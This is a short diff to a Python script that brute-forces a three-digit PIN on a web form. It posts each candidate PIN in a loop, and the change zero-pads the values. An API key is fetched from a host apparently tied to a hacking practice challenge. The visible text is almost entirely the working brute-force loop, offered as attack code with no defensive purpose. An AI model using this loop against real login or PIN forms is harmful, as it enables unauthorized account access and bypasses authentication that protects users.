@@ -16,9 +16,8 @@ sleep_time = 30
 response = r.get("http://104.cybertrial.co.uk/?mykey=" + key)
 #print("API Key Get Request Response Code: " + str(response.status_code))
 
-#for curPin in range(0, 1000):
 for i in range(min, max, 1):
-    payload = {"formgo": "1", "pin": str(i)}
+    payload = {"formgo": "1", "pin": str("{0:0=3d}".format(i))}
     print("Trying pin: " + payload["pin"])
 
     response = r.post(url, data=payload)
